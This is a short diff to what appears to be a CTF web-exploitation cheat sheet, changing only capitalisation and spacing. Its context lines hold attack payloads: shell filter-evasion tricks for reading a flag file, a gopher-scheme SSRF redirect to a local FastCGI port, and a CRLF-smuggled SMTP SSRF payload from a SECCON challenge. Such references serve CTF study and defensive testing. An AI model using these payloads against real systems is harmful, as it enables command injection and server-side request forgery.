@@ -174,7 +174,7 @@ cat $(ls)
         - `${PATH:0:1}   => '/'`
         - `${PATH:1:1}   => 'u'`
         - `${PATH:0:4}   => '/usr'`
-- empty string
+- Empty String
     - `cat fl""ag`
     - `cat fl''ag`
 
@@ -694,7 +694,9 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
 ### SMTP
 
 SECCON 2017 SqlSRF:
+
 `127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckqqrr18%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/`
+
 ## FingerPrint
 
 - dict
